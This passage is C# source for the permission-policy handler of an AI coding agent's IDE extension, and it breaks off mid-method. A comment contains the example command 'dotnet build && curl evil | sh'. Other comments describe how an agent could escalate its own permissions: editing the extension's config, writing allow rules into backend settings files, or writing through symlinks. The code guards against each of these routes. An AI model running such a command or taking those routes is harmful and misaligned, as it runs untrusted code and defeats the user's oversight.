using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using CodeWicket.Core;
using CodeWicket.Core.Ide;

namespace CodeWicket.Shell
{
    /// <summary>
    /// Applies the permission policy before a request reaches the user: the current
    /// <see cref="PermissionMode"/> can auto-allow/auto-reject, and the user's "always" choices are
    /// remembered for the session so the same kind of action isn't asked twice. Only genuinely
    /// undecided requests fall through to the wrapped prompt handler (the chat banner / msgbox).
    /// Lives in the shell — where the permission round-trip terminates — so it is provider-agnostic.
    /// </summary>
    public sealed class PolicyPermissionHandler : IPermissionHandler
    {
        private readonly IPermissionHandler _prompt;
        private readonly Action<string>? _log;
        private readonly ConcurrentDictionary<string, bool> _remembered = new(StringComparer.OrdinalIgnoreCase);
        private readonly ConcurrentDictionary<string, CommandRule> _sessionAllowCommands = new(StringComparer.OrdinalIgnoreCase);
        private readonly ConcurrentDictionary<string, Regex> _sessionAllowPaths = new(StringComparer.OrdinalIgnoreCase);
        // The deny counterparts of the session allow globs, from a "Deny (this session)" choice. Session-
        // only by design (no persist option). Checked ahead of every allow rule, so a deny wins; these are
        // the user's own explicit in-session choices, so they auto-deny silently.
        private readonly ConcurrentDictionary<string, Regex> _sessionDenyCommands = new(StringComparer.OrdinalIgnoreCase);
        private readonly ConcurrentDictionary<string, Regex> _sessionDenyPaths = new(StringComparer.OrdinalIgnoreCase);
        // Tools trusted for THIS session ("always allow" without the persist box), in the same
        // canonical server/tool form the config list uses — never regexes: a tool rule names one tool
        // and has no scope to widen, so there is nothing to glob.
        private readonly ConcurrentDictionary<string, bool> _sessionAllowTools = new(StringComparer.OrdinalIgnoreCase);
        private volatile PermissionMode _mode;
        private volatile CommandRule[] _allowCommands = Array.Empty<CommandRule>();
        // Aggressive, unanchored substring patterns for sensitive commands that must ALWAYS be reviewed:
        // a match forces the banner (overriding allow-list AND mode) and flags it, rather than silently
        // blocking. NOT a hard deny — every match is reviewable (see RequestAsync's caution tier).
        private volatile Regex[] _alwaysPromptCommands = Array.Empty<Regex>();
        private volatile Regex[] _allowPaths = Array.Empty<Regex>();
        // Permanently trusted tools (config's AllowedTools), canonical server/tool — one shape for
        // every server, ours included, so there is one match path and no "bare means ours" rule for a
        // reader (or this code) to remember.
        private volatile string[] _allowTools = Array.Empty<string>();
        private volatile IReadOnlyDictionary<string, ToolDescriptor> _toolRisks =
            new Dictionary<string, ToolDescriptor>(StringComparer.Ordinal);
        // The extension's own state. On by default and NOT read from config, because config is the
        // file it exists to protect (pre-release security review, September 2026) - see ProtectedPaths.
        private volatile ProtectedPaths _protectedPaths = ProtectedPaths.Default;
        // The directory the agent is running in, pushed down by the host when a session reports it.
        // Null until then, and null for good in a host that never reports one - and null is what
        // keeps the link check below off the disk entirely, since it has nothing to measure from.
        private volatile string? _workspaceRoot;

        /// <summary>
        /// Optional sink for a command glob the user chose to remember <em>permanently</em> (the "make
        /// permanent" checkbox). The host wires this to persist it (e.g. to config's allow-list); when
        /// null, or the user left it session-scoped, the glob is only remembered for the session.
        /// </summary>
        /// <summary>
        /// Raised with (toolCallId, outcome) each time a request is decided, so the transcript row can
        /// say HOW it was permitted. Best-effort and purely for display: it never affects the decision,
        /// and a throwing subscriber is swallowed rather than allowed to fail a permission check.
        /// <para>Nothing is raised when the turn is CANCELLED mid-prompt: we asked and never got an
        /// answer, so there is no outcome, and recording one would invent a decision nobody made.</para>
        /// </summary>
        public Action<string, PermissionOutcome>? OutcomeReported { get; set; }

        public Action<string>? PersistAllowedCommand { get; set; }

        /// <summary>
        /// Optional sink for a file-path glob the user chose to remember permanently — the edit-scoped
        /// counterpart of <see cref="PersistAllowedCommand"/>. The host wires it to persist to config's
        /// path allow-list; when null, or the user left it session-scoped, the glob lives only for the
        /// session.
        /// </summary>
        public Action<string>? PersistAllowedPath { get; set; }

        /// <summary>
        /// Optional sink for an IDE tool the user chose to trust permanently — the tool-scoped
        /// counterpart of the two above (issue #129). The host wires it to config's tool allow-list;
        /// the name arrives already normalized to canonical <c>server/tool</c>. Null, or a
        /// session-scoped choice, keeps it in <see cref="_sessionAllowTools"/> for this session only.
        /// </summary>
        public Action<string>? PersistAllowedTool { get; set; }

        /// <param name="log">
        /// Optional sink for one line per decision (which rule fired), so command allow/deny and mode
        /// auto-decisions are observable in the log rather than silent. Null disables it.
        /// </param>
        public PolicyPermissionHandler(IPermissionHandler prompt, PermissionMode mode, Action<string>? log = null)
        {
            _prompt = prompt;
            _mode = mode;
            _log = log;
        }

        /// <summary>
        /// The directories a write is never auto-approved into — the host's own state, by default
        /// (<see cref="Core.ProtectedPaths.Default"/>). A host with no state of its own may set
        /// <see cref="Core.ProtectedPaths.None"/>; tests set fake roots. Deliberately not a
        /// <c>Set…Policy</c> method like the lists above: those are read from config, and this one must
        /// never be, since config.json is the first file it guards.
        /// </summary>
        public ProtectedPaths ProtectedPaths
        {
            get => _protectedPaths;
            set => _protectedPaths = value ?? throw new ArgumentNullException(nameof(value));
        }

        /// <summary>
        /// The directory the agent is running in — not necessarily the solution root (issue #54) —
        /// which is what <see cref="Core.LinkedWrite"/> measures "below the workspace" from. Set by the
        /// host each time a session reports its working directory, so the guard and the edit applier
        /// judge a path against the same tree. Null disables the check rather than widening it.
        /// </summary>
        public string? AgentWorkspaceRoot
        {
            get => _workspaceRoot;
            set => _workspaceRoot = string.IsNullOrWhiteSpace(value) ? null : value;
        }

        /// <summary>The active mode. Changing it clears remembered "always" choices.</summary>
        public PermissionMode Mode
        {
            get => _mode;
            set { _mode = value; ResetRemembered(); }
        }

        /// <summary>Forgets remembered "always" choices (e.g. on a new session).</summary>
        public void ResetRemembered()
        {
            _remembered.Clear();
            _sessionAllowCommands.Clear();
            _sessionAllowPaths.Clear();
            _sessionAllowTools.Clear();
            _sessionDenyCommands.Clear();
            _sessionDenyPaths.Clear();
        }

        /// <summary>
        /// Sets the command allow-list and the always-prompt (sensitive) list (glob patterns:
        /// <c>*</c>/<c>?</c>, case-insensitive). An <paramref name="allow"/> match auto-approves without
        /// prompting (anchored/exact — see the risk boundary in <see cref="RequestAsync"/>); an
        /// <paramref name="alwaysPrompt"/> match forces the banner even under an auto-approve mode
        /// (unanchored substring, aggressive by design — a false positive just costs one review).
        /// </summary>
        public void SetCommandPolicy(IEnumerable<string>? allow, IEnumerable<string>? alwaysPrompt)
        {
            _allowCommands = (allow ?? Enumerable.Empty<string>())
                .Where(g => !string.IsNullOrWhiteSpace(g))
                .Select(CommandRule.From)
                .ToArray();
            _alwaysPromptCommands = Compile(alwaysPrompt, anchored: false);
        }

        /// <summary>
        /// Sets the file-path allow-list (glob patterns matched against the absolute path a
        /// file-scoped request targets, e.g. <c>C:\repo\src\*</c>). Anchored like the command
        /// allow-list — a wildcard-free rule means exactly that file. Slashes match either way.
        /// A matching edit/read request is auto-approved without prompting.
        /// </summary>
        /// <remarks>
        /// The slash normalization runs INSIDE <see cref="Compile"/>'s filter rather than before it.
        /// Mapped on the way in, <c>NormalizeSlashes</c> reached a null element ahead of the
        /// <c>IsNullOrWhiteSpace</c> guard that exists to drop one, so a config with
        /// <c>"allowedPaths": ["C:\\repo\\*", null]</c> threw out of here — and the callers are
        /// <c>ChatToolWindow</c>'s startup and its <c>ExtensionConfig.Changed</c> handler, neither of
        /// which catches. <see cref="SetCommandPolicy"/> passes its sequence through unmapped and was
        /// null-safe by accident; the asymmetry was the bug, not the null.
        /// </remarks>
        public void SetPathPolicy(IEnumerable<string>? allow) =>
            _allowPaths = Compile(allow, anchored: true, map: NormalizeSlashes);

        /// <summary>
        /// Sets the MCP tool allow-list — exact tool names in canonical <c>server/tool</c> form,
        /// auto-approved whatever the mode. Deliberately not globs: a rule names one tool, so there is
        /// no scope to widen and a wildcard could only widen it by surprise.
        /// <para>Entries are normalized through <see cref="IdeMcpServer.TryNormalizeToolRule"/>, so a
        /// hand-typed bare name gains our server and anyone else's keeps theirs — which is the
        /// collision guard: a rule always names one server's tool (issue #129). This is an ALLOW tier —
        /// deny and caution still run first, so a sensitive pattern forces the banner however the tool
        /// is trusted.</para>
        /// </summary>
        public void SetToolPolicy(IEnumerable<string>? allow)
        {
            var rules = new List<string>();
            foreach (var entry in allow ?? Enumerable.Empty<string>())
                if (IdeMcpServer.TryNormalizeToolRule(entry, out var rule) &&
                    !rules.Exists(r => string.Equals(r, rule, StringComparison.OrdinalIgnoreCase)))
                    rules.Add(rule);
            _allowTools = rules.ToArray();
        }

        /// <summary>
        /// Registers the IDE tool catalog's authored risk classifications so the mode ladder can resolve
        /// the risk of an MCP tool request by name — the reliable signal for our own tools (whose requests
        /// carry no useful kind). Requests for tools not in this map fall back to kind-derived risk.
        /// Safe to call with an empty catalog (e.g. the stub IDE), which just leaves every request on the
        /// kind fallback.
        /// </summary>
        public void SetToolRisks(IEnumerable<ToolDescriptor>? tools)
        {
            // The whole descriptor, not just its Risk: a tool may resolve the risk of ONE call from its
            // arguments (ToolDescriptor.RiskForArguments), and dropping everything but the static tier
            // here would silently discard that.
            var map = new Dictionary<string, ToolDescriptor>(StringComparer.Ordinal);
            foreach (var t in tools ?? Enumerable.Empty<ToolDescriptor>())
            {
                if (!string.IsNullOrEmpty(t.Name))
                    map[t.Name] = t;
            }
            _toolRisks = map;
        }

        public async Task<PermissionDecision> RequestAsync(PermissionRequest request, CancellationToken cancellationToken = default)
        {
            var matchText = (request.Title ?? string.Empty) + "\n" + (request.Detail ?? string.Empty);
            var key = PolicyKey(request);

            // 0) DENY tier — a block always wins over any allow. These are the user's OWN in-session
            //    choices ("Deny (this session)"), so they auto-deny silently:
            //      * session deny globs (command/path): anchored like their allow twins (a wildcard-free
            //        glob means exactly that command/file; widen with "*"). We answer the agent reject_once
            //        and enforce the rule ourselves, uniform across backends.
            //      * a remembered-by-key deny (kind/tool) for a request that carried no glob subject.
            //    (There is no config "hard deny" tier — the retired DeniedCommands became the reviewable
            //    AlwaysPromptCommands caution tier below.)
            if (MatchesCommand(_sessionDenyCommands.Values, request.Command))
                return Log(request, "remembered-deny-command", Decide(request, allow: false), PermissionOutcomeKind.RuleDenied);
            if (MatchesPath(_sessionDenyPaths.Values, request.Path))
                return Log(request, "remembered-deny-path", Decide(request, allow: false), PermissionOutcomeKind.RuleDenied);
            if (_remembered.TryGetValue(key, out var rememberedDeny) && !rememberedDeny)
                return Log(request, "remembered-deny", Decide(request, allow: false), PermissionOutcomeKind.RuleDenied);

            // 1) CAUTION tier — sensitive commands that must ALWAYS be reviewed. A match forces the banner
            //    (skips every auto-approve below) and flags the request so the UI can call out the matched
            //    text in red, strip "Allow always", and require an extra confirm. NOT a silent block: the
            //    user always gets to reassess. Deliberately overrides the allow-list and mode too — "always
            //    prompt" means always, so you can't allow-list or AcceptAll your way past it.
            //
            //    A WRITE INTO THE EXTENSION'S OWN STATE sits on this tier as a built-in rule (pre-release
            //    security review, September 2026): config.json is re-read into this very policy on the next
            //    settings save and names what the next engine launch spawns, so under AcceptEdits an
            //    unguarded edit there was a route from the Edit tier to unrestricted commands. It is
            //    checked AHEAD of every allow rule and remembered glob for the same reason the caution
            //    list is - and it is not itself a configurable rule, because the configuration is the
            //    file being written. The fragment is the path, so the banner highlights it; the reason
            //    rides beside it so the banner does not attribute the stop to a rule the user never made.
            //
            //    A WRITE TO A FILE THAT SETS WHAT THE AGENT MAY DO WITHOUT ASKING sits here too (issue
            //    #269 follow-on, Core.EscalationFiles): the backends' own permission configuration -
            //    .claude/settings*.json, .kiro/agents/**, Kiro's permissions.yaml - is read by a gate
            //    that runs BEFORE ours, and once an allow rule is in one of those files the agent stops
            //    asking and this policy sees nothing. The write that puts it there is the one step that
            //    is visible, so it is flagged: on a file-scoped write by its path, on a command line by
            //    the file's spelling in the text (where a read cannot be told from a write, so both
            //    ask). Code, not config, for ProtectedPaths' reason.
            //
            //    The protected-path rule takes the same command route: a line spelling our own settings
            //    file (ProtectedPaths.MatchCommandText) is flagged on that spelling. Like the escalation
            //    files' route it is a spelling test, not a guard on the file - a line that writes
            //    config.json without spelling code-wicket\config.json passes it, as does anything a
            //    command launches.
            //    AND A WRITE THAT REACHES ITS FILE THROUGH A LINK sits here as the third built-in rule
            //    (Core.LinkedWrite). Both rules above judge a SPELLING, resolved without touching the
            //    disk, so a junction inside the working tree hands the agent a path that passes them
            //    and lands somewhere neither would have allowed. Making one is a command and needs no
            //    privilege, so nothing above is asked about it first. Where a component below the
            //    agent's root redirects, the path says nothing about where the bytes go and the user
            //    decides; a link ABOVE the root moves nothing out of reach and is not read.
            var protectedWrite = IsProtectedWrite(request);
            var escalation = protectedWrite ? null : MatchEscalationFile(request, matchText);
            var protectedCommand = protectedWrite ? null : MatchProtectedCommand(request, matchText);
            var linked = protectedWrite || escalation is not null ? null : MatchLinkedWrite(request);
            // Ours ahead of the backends' where one line names both, as on the path route.
            var builtIn = protectedCommand ?? escalation ?? linked;
            var flagged = protectedWrite ? request.Path
                : builtIn?.Fragment ?? MatchFragment(_alwaysPromptCommands, matchText);
            var cautionReason = protectedWrite ? ProtectedPaths.RowReason : builtIn?.RowReason;
            // Set when a WILDCARD command rule matched the line and was withheld because the line
            // carries a shell operator (pre-release security review, September 2026): the banner tells the user which rule
            // and why, so a rule they can see in their settings does not seem to have silently
            // failed. Ordinary banner, not the red one - see ShellOperators.
            string? ruleNote = null;
            if (flagged is null)
            {
                // 2) ALLOW tier — auto-approve trusted actions so they aren't prompted even in Prompt mode.
                //    ALLOW is a privilege grant, so it's conservative: an *anchored* match against the clean
                //    command/path only. A rule "dotnet build" auto-approves exactly "dotnet build", NOT
                //    "dotnet build && curl evil | sh" — widening requires an explicit wildcard ("dotnet
                //    build *"). Non-command requests carry no Command; requests without a Path (commands,
                //    MCP tools) can never satisfy a path rule.
                if (MatchesAllowCommand(_allowCommands, request.Command, ref ruleNote))
                    return Log(request, "allow-list", Decide(request, allow: true), PermissionOutcomeKind.RuleAllowed, rulePersisted: true);
                if (MatchesAllowCommand(_sessionAllowCommands.Values, request.Command, ref ruleNote))
                    return Log(request, "remembered-command", Decide(request, allow: true), PermissionOutcomeKind.RuleAllowed);
                if (MatchesPath(_allowPaths, request.Path))
                    return Log(request, "path-allow-list", Decide(request, allow: true), PermissionOutcomeKind.RuleAllowed, rulePersisted: true);
                if (MatchesPath(_sessionAllowPaths.Values, request.Path))
                    return Log(request, "remembered-path", Decide(request, allow: true), PermissionOutcomeKind.RuleAllowed);

                // A named IDE tool the user trusts — permanently (config) or for this session. Ahead of
                // remember-by-key because it is the same subject expressed durably: the key memory is
                // what a tool "always" falls back to when there is no rule to save (issue #129).
                if (MatchesTool(request, out var fromConfig))
                    return Log(request, fromConfig ? "tool-allow-list" : "remembered-tool",
                        Decide(request, allow: true), PermissionOutcomeKind.RuleAllowed, rulePersisted: fromConfig);

                // A remembered-by-key "always allow" for this kind of action.
                if (_remembered.TryGetValue(key, out var rememberedAllow) && rememberedAllow)
                    return Log(request, "remembered", Decide(request, allow: true), PermissionOutcomeKind.RuleAllowed);

                // 3) Mode-based auto-decisions: a cumulative risk ladder. The active mode sets a ceiling; a
                //    request is auto-approved when its resolved risk is at or below that ceiling. Anything
                //    above (or on Prompt) falls through to the user.
                var risk = ResolveRisk(request);
                if (AutoAllows(Mode, risk))
                    // The log keeps the mode AND the resolved risk - that pair is what explains the
                    // decision when reading a log. The ROW gets the dropdown's own words instead: the
                    // user is being told about a setting they chose and can see named two inches below.
                    return Log(request, $"mode={Mode}(risk={risk})", Decide(request, allow: true),
                        PermissionOutcomeKind.ModeAllowed, ruleOverride: PermissionModeLabel.For(Mode));
            }

            // 4) Otherwise ask the user, and remember an "always" answer for the session. A flagged request
            //    carries its matched fragment to the banner (red call-out, no "always", confirm-on-allow).
            // The resolved tier, because the ALLOW line has always carried it and this one never did -
            // so "why did that prompt when the mode should have allowed it" was unanswerable from the
            // log for the one event where it is the whole question. args= is here for the same reason:
            // a tool whose tier depends on its arguments cannot be diagnosed without knowing whether any
            // arrived (issue #73).
            _log?.Invoke(
                $"[permission] prompt: \"{request.Title}\" (kind={request.Kind ?? "?"}, risk={ResolveRisk(request)}" +
                $", args={(request.ArgumentsJson is null ? "none" : request.ArgumentsJson.Length + " chars")}" +
                $"{(flagged is null ? "" : $", flagged=\"{flagged}\"")}{(protectedWrite || protectedCommand is not null ? ", protected-path" : escalation is not null ? ", escalation-file" : linked is not null ? ", linked-path" : "")}" +
                $"{(ruleNote is null ? "" : ", rule-withheld")})");
            var promptRequest = flagged is null && ruleNote is null
                ? request
                : request with
                {
                    FlaggedFragment = flagged,
                    FlaggedReason = protectedWrite ? ProtectedPaths.BannerReason : builtIn?.BannerReason,
                    RuleNote = ruleNote,
                };
            var decision = await _prompt.RequestAsync(promptRequest, cancellationToken).ConfigureAwait(false);
            if (!decision.Cancelled)
            {
                var chosen = request.Options.FirstOrDefault(o => o.OptionId == decision.OptionId);
                if (chosen?.Kind is PermissionOptionKind.AllowAlways)
                {
                    RememberAllow(key, decision);
                    // Our policy owns EVERY "always": remember it client-side (command glob, path glob,
                    // or kind/tool-name memory) and answer the agent with a plain "allow once" — the
                    // agent keeps asking and our policy auto-approves, instead of the agent persisting
                    // its own always-rule (Claude writes its settings, Kiro v3 its permissions.yaml).
                    // Uniform across backends; the rules live in OUR config, per the 2026-07-02 decision.
                    return Log(request, "always→once", Decide(request, allow: true),
                        PermissionOutcomeKind.UserAllowed, decision.PersistRemembered,
                        cautionPrompted: flagged is not null, ruleOverride: RememberedRule(decision),
                        cautionReason: cautionReason);
                }
                if (chosen?.Kind is PermissionOptionKind.RejectAlways)
                {
                    RememberDeny(key, decision);
                    // Symmetric with allow: own the "always" client-side (session deny glob / path glob,
                    // else remember-by-key) and answer the agent a plain "reject once" — the agent keeps
                    // asking and our policy keeps denying, uniform across backends, rather than the agent
                    // persisting its own deny rule (Claude to its settings, Kiro to permissions.yaml).
                    return Log(request, "always→once", Decide(request, allow: false),
                        PermissionOutcomeKind.UserDenied, cautionPrompted: flagged is not null,
                        ruleOverride: RememberedRule(decision), cautionReason: cautionReason);
                }
            }

            // A plain once answer. Cancelled is deliberately NOT reported: the turn was aborted while
            // the banner was open, so there is no decision to describe, and "no record" is the truthful
            // state for that row rather than a decision nobody made.
            if (!decision.Cancelled)
            {
                var answered = request.Options.FirstOrDefault(o => o.OptionId == decision.OptionId);
                var allowed = answered?.Kind is PermissionOptionKind.AllowOnce or PermissionOptionKind.AllowAlways;
                Report(request, new PermissionOutcome(
                    allowed ? PermissionOutcomeKind.UserAllowed : PermissionOutcomeKind.UserDenied,
                    RememberedRule(decision), decision.PersistRemembered, flagged is not null, cautionReason));
            }

            return decision;
        }

        // The glob or tool rule the user saved with an "always" answer, for the row's detail ("you
        // allowed, and saved `dotnet build *`"). Null on a plain once answer, which saves nothing.
        private static string? RememberedRule(PermissionDecision decision) =>
            decision.RememberCommand ?? decision.RememberPath ?? decision.RememberTool;

        // Logs which policy rule decided a request, reports the outcome for the transcript row, then
        // returns the decision unchanged. The KIND is passed in rather than parsed back out of `rule`:
        // that string is a log line, and re-deriving meaning from a display string is how the row and
        // the log would drift apart.
        private PermissionDecision Log(
            PermissionRequest request, string rule, PermissionDecision decision,
            PermissionOutcomeKind kind, bool rulePersisted = false, bool cautionPrompted = false,
            string? ruleOverride = null, string? cautionReason = null)
        {
            _log?.Invoke($"[permission] {rule} → {decision.OptionId}: \"{request.Title}\"");
            Report(request, new PermissionOutcome(kind, ruleOverride ?? rule, rulePersisted, cautionPrompted, cautionReason));
            return decision;
        }

        // A file-scoped request that is not a read, targeting the host's own state. Reads are let
        // through: what this escalates through is the state being rewritten, and a read grants nothing.
        // An unkinded request with a path counts as a write - the conservative direction, and the
        // shape Kiro v2's trust options produce for an fs write with no recognisable setting key.
        private bool IsProtectedWrite(PermissionRequest request) =>
            request.Path is not null && !IsReadKind(request.Kind) && _protectedPaths.Contains(request.Path);

        // A request that touches one of the backends' own permission files (Core.EscalationFiles). A
        // file-scoped request is judged on its path, reads exempt for the same reason as above; a
        // request with no path - a shell command - on the text the caution list scans, so the
        // fragment the banner highlights is the spelling on screen. Null when neither applies.
        private static CautionMatch? MatchEscalationFile(PermissionRequest request, string matchText)
        {
            if (request.Path is not null)
                return !IsReadKind(request.Kind) && EscalationFiles.MatchPath(request.Path)
                    ? new CautionMatch(request.Path, EscalationFiles.WriteBannerReason, EscalationFiles.WriteRowReason)
                    : null;
            var fragment = EscalationFiles.MatchText(matchText);
            return fragment is null
                ? null
                : new CautionMatch(fragment, EscalationFiles.CommandBannerReason, EscalationFiles.CommandRowReason);
        }

        // Our own settings file spelled on a command line (ProtectedPaths.MatchCommandText). A request
        // with a path is IsProtectedWrite's to judge, reads exempt; a command line cannot tell a read
        // from a write, so here both ask, as for the escalation files. Null when neither applies.
        private CautionMatch? MatchProtectedCommand(PermissionRequest request, string matchText)
        {
            if (request.Path is not null)
                return null;
            var fragment = _protectedPaths.MatchCommandText(matchText);
            return fragment is null
                ? null
                : new CautionMatch(fragment, ProtectedPaths.CommandBannerReason, ProtectedPaths.CommandRowReason);
        }

        // A file-scoped write whose path reaches its file through a symlink or junction below the
        // agent's own root (Core.LinkedWrite) - the case the two spelling tests above cannot see.
        // Reads are exempt for their reason; a request with no path, and a host that has reported no
        // root, are not this rule's business and touch no disk. The fragment is the path, as it is
        // for a protected write, so the banner highlights the thing being judged.
        private CautionMatch? MatchLinkedWrite(PermissionRequest request) =>
            request.Path is not null
            && !IsReadKind(request.Kind)
            && LinkedWrite.Reaches(_workspaceRoot, request.Path)
                ? new CautionMatch(request.Path, LinkedWrite.BannerReason, LinkedWrite.RowReason)
                : null;

        // A built-in caution rule's hit: the fragment the banner highlights and the rule's own two
        // sentences. A plain class, not a record: Shell multi-targets net472 and carries no IsExternalInit.
        private sealed class CautionMatch
        {
            public CautionMatch(string fragment, string bannerReason, string rowReason)
            {
                Fragment = fragment;
                BannerReason = bannerReason;
                RowReason = rowReason;
            }

            public string Fragment { get; }
            public string BannerReason { get; }
            public string RowReason { get; }
        }

        // Never lets a display concern break a permission decision.
        private void Report(PermissionRequest request, PermissionOutcome outcome)
        {
            if (string.IsNullOrEmpty(request.ToolCallId))
                return;
            try { OutcomeReported?.Invoke(request.ToolCallId, outcome); }
            catch { /* the badge is cosmetic; the decision is not */ }
        }

        // Records an "always allow" choice. For a command (RememberCommand) or a file-scoped edit
        // (RememberPath) the user was offered an editable glob, so "always" means "always allow
        // requests matching this pattern" — remembered by the (possibly-edited) glob rather than the
        // coarse kind, and optionally persisted durably. Everything else falls back to
        // remember-by-key (tool name or kind).
        private void RememberAllow(string key, PermissionDecision decision)
        {
            var commandGlob = decision.RememberCommand?.Trim();
            if (!string.IsNullOrEmpty(commandGlob))
            {
                _sessionAllowCommands[commandGlob!] = CommandRule.From(commandGlob!);
                _log?.Invoke($"[permission] remember command glob: \"{commandGlob}\"" + (decision.PersistRemembered ? " (persist)" : ""));
                if (decision.PersistRemembered)
                    PersistAllowedCommand?.Invoke(commandGlob!);
                return;
            }

            var pathGlob = decision.RememberPath?.Trim();
            if (!string.IsNullOrEmpty(pathGlob))
            {
                _sessionAllowPaths[pathGlob!] = GlobToRegex(NormalizeSlashes(pathGlob!), anchored: true);
                _log?.Invoke($"[permission] remember path glob: \"{pathGlob}\"" + (decision.PersistRemembered ? " (persist)" : ""));
                if (decision.PersistRemembered)
                    PersistAllowedPath?.Invoke(pathGlob!);
                return;
            }

            // A named tool: no glob, so what's remembered is the name in the same canonical shape the
            // config list stores — a session grant and a permanent one then mean exactly the same
            // thing and differ only in how long they last. An unparseable name falls through to the
            // key memory below.
            var tool = decision.RememberTool?.Trim();
            if (!string.IsNullOrEmpty(tool) && IdeMcpServer.TryNormalizeToolRule(tool, out var rule))
            {
                _sessionAllowTools[rule] = true;
                _log?.Invoke($"[permission] remember tool: \"{rule}\"" + (decision.PersistRemembered ? " (persist)" : ""));
                if (decision.PersistRemembered)
                    PersistAllowedTool?.Invoke(rule);
                return;
            }

            _remembered[key] = true;
        }

        // The deny twin of RememberAllow: a "Deny always" choice on a scoped request stores the (possibly
        // edited) command/path glob as a session deny rule; an unscoped one falls back to remember-by-key.
        // Session-only — there is intentionally no persist path (deny offers no "save permanently").
        private void RememberDeny(string key, PermissionDecision decision)
        {
            var commandGlob = decision.RememberCommand?.Trim();
            if (!string.IsNullOrEmpty(commandGlob))
            {
                _sessionDenyCommands[commandGlob!] = GlobToRegex(commandGlob!, anchored: true);
                _log?.Invoke($"[permission] remember deny command glob: \"{commandGlob}\"");
                return;
            }

            var pathGlob = decision.RememberPath?.Trim();
            if (!string.IsNullOrEmpty(pathGlob))
            {
                _sessionDenyPaths[pathGlob!] = GlobToRegex(NormalizeSlashes(pathGlob!), anchored: true);
                _log?.Invoke($"[permission] remember deny path glob: \"{pathGlob}\"");
                return;
            }

            _remembered[key] = false;
        }

        // "Always" choices are remembered by the MCP tool's name when the request carries one (so
        // "always" on run_tests doesn't blanket-approve every unkinded request), else by the action's
        // kind (its title varies per file/command).
        private static string PolicyKey(PermissionRequest r) =>
            TrustedToolName(r) is { } tool ? "tool:" + tool :
            !string.IsNullOrEmpty(r.Kind) ? "kind:" + r.Kind : "title:" + r.Title;

        /// <summary>
        /// The tool name a policy may TRUST: the request's name, unless the frame is a shell command,
        /// in which case there is none.
        /// <para>Every by-name grant in this class goes through here - the authored risk tier, the
        /// <c>server/tool</c> rules, and the remember-by-key memory - because each of them is a way a
        /// name can LOWER what a shell command is held to (pre-release security review, September 2026). The mapper already
        /// refuses to lift a name out of a shell frame's title; this is the same rule applied to
        /// whatever name arrives, so a structured <c>toolName</c> beside a real <c>rawInput.command</c>
        /// resolves as the command it is, and a request built without the mapper is held to it too.</para>
        /// <para>What makes a frame a shell command is a fact the BACKEND stated, never the title:
        /// an execute kind (Kiro v2's trustOptions, v3's consent.capability and Claude's Bash all
        /// derive one) or a resolved command, which the mapper only ever takes from rawInput or the
        /// tool_call cache once a name is in play. Neither is something an MCP call on either backend
        /// carries, so a real IDE tool call keeps its name and its tier exactly as before - the cost
        /// the earlier attempt at this fix paid, distrusting the title everywhere, is not paid here.
        /// The one thing that changes hands is an MCP tool whose own schema has an argument named
        /// <c>command</c>: it already resolved a command subject and a command glob in the banner, and
        /// now sits at the Command tier on the mode ladder to match. Our <c>run_command</c> is the only
        /// such tool of ours and is authored Command already.</para>
        /// </summary>
        private static string? TrustedToolName(PermissionRequest r) =>
            IsShellCommand(r) || string.IsNullOrEmpty(r.ToolName) ? null : r.ToolName;

        // Mirrors AcpMapper.IsCommandKind: an execute/command kind is the backend's own statement
        // that this is a shell command, however the title reads.
        private static bool IsShellCommand(PermissionRequest r) =>
            !string.IsNullOrEmpty(r.Command) ||
            (r.Kind is not null &&
             (r.Kind.IndexOf("execute", StringComparison.OrdinalIgnoreCase) >= 0 ||
              r.Kind.IndexOf("command", StringComparison.OrdinalIgnoreCase) >= 0));

        // The risk tiers the mode ladder gates on, ordered low → high. A mode auto-allows every tier up to
        // its ceiling (see AutoAllows).
        private enum RiskLevel { Read = 0, Edit = 1, Command = 2 }

        // Resolves the risk of a request for the ladder. The authored risk of one of *our* IDE tools
        // (matched by its namespaced MCP name) is the primary signal — it's the only reliable one for our
        // tools, whose requests carry no useful kind (Kiro sends none). Everything else derives from the
        // action kind, with commands and anything unrecognised treated as top-tier (only AcceptAll).
        private RiskLevel ResolveRisk(PermissionRequest request)
        {
            // TrustedToolName, not ToolName: a shell command resolves by its kind (top tier) however
            // its title happens to be spelled - see the remarks there.
            if (IdeMcpServer.TryResolveLocalTool(TrustedToolName(request), out var localName) &&
                _toolRisks.TryGetValue(localName, out var descriptor))
                return Tier(descriptor.Risk);

            if (IsEdit(request)) return RiskLevel.Edit;
            if (IsReadKind(request.Kind)) return RiskLevel.Read;
            return RiskLevel.Command;
        }

        private static RiskLevel Tier(ToolRisk risk) => risk switch
        {
            ToolRisk.Command => RiskLevel.Command,
            ToolRisk.Edit => RiskLevel.Edit,
            _ => RiskLevel.Read,
        };

        // Whether a mode auto-approves a given risk. The ladder is cumulative: each mode's ceiling covers
        // its own tier and every lower one (AcceptEdits allows reads AND edits; AcceptAll allows all).
        private static bool AutoAllows(PermissionMode mode, RiskLevel risk) => mode switch
        {
            PermissionMode.AcceptReads => risk <= RiskLevel.Read,
            PermissionMode.AcceptEdits => risk <= RiskLevel.Edit,
            PermissionMode.AcceptAll => true,
            _ => false, // Prompt
        };

        // File-mutating kinds that count as edits. Covers our derived kinds (edit/write/create) and the
        // standard ACP ToolKinds delete/move, which are also edits.
        private static readonly string[] EditKinds = { "edit", "write", "create", "delete", "move" };

        private static bool IsEdit(PermissionRequest r) =>
            r.Kind is not null &&
            Array.Exists(EditKinds, k => r.Kind.IndexOf(k, StringComparison.OrdinalIgnoreCase) >= 0);

        // Read-only action kinds (the backend's own read/fetch-of-workspace tools). Deliberately narrow —
        // anything not clearly a read or an edit stays top-tier so only AcceptAll auto-allows it.
        private static bool IsReadKind(string? kind) =>
            kind is not null && kind.IndexOf("read", StringComparison.OrdinalIgnoreCase) >= 0;

        // Returns the allow/reject option the agent offered, strictly preferring the "once" variant so
        // an auto/remembered approval never asks the agent to persist its own "always" rule (our policy
        // owns "always"). Falls back to the "always" kind, then a synthetic id.
        private static PermissionDecision Decide(PermissionRequest request, bool allow)
        {
            var order = allow
                ? new[] { PermissionOptionKind.AllowOnce, PermissionOptionKind.AllowAlways }
                : new[] { PermissionOptionKind.RejectOnce, PermissionOptionKind.RejectAlways };

            foreach (var kind in order)
            {
                var option = request.Options.FirstOrDefault(o => o.Kind == kind);
                if (option is not null)
                    return new PermissionDecision(option.OptionId);
            }

